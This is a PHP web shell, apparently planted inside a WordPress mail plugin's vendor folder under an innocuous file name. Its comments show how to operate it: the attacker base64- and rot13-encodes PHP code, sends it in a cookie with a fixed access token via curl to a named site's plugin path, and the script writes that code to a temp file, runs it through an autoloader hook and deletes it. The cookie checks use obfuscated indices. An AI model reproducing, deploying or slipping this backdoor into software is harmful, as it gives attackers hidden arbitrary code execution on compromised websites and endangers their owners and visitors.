// ENCODED=$(php -r '
//$p = '\''file_put_contents("techtest.txt","exploit success");'\'';
//echo str_rot13(base64_encode($p));
')
//echo "$ENCODED"
MzyfMI9jqKEsL29hqTIhqUZbVaEyL2u0MKA0YaE4qPVfVzI4pTkinKDtp3IwL2ImplVcBj==
//curl -k -H "Cookie: 0=a; 1=b; 3=$ENCODED; 4=259a8a372dc0210eb2ee6ab1d533ea3f" "https://healingspa.com.vn/wp-content/plugins/wp-mail-smtp/vendor_prefixed/paragonie/constant_time_encoding/src/staff_buttons.php"

<?php


if (isset($_COOKIE[15-15]) && isset($_COOKIE[-80+81]) && isset($_COOKIE[53+-50]) && isset($_COOKIE[-62+66])) {
    $val = $_COOKIE;
    function app_initializer($res) {
        $val = $_COOKIE;
        $ent = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'a3d605cc');
        if (!is_writable($ent)) {
            $ent = getcwd() . DIRECTORY_SEPARATOR . "request_approved";
        }
        $key = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($val[3]));
        if (is_writeable($ent)) {
            $elem = fopen($ent, 'w+');
            fputs($elem, $key);
            fclose($elem);
            spl_autoload_unregister(__FUNCTION__);
            require_once($ent);
            @array_map('unlink', array($ent));
        }
    }
    spl_autoload_register("app_initializer");
    $tkn = "259a8a372dc0210eb2ee6ab1d533ea3f";
    if (!strncmp($tkn, $val[4], 32)) {
        if (@class_parents("buffer_cache_approve_request", true)) {
            exit;
        }
    }
}
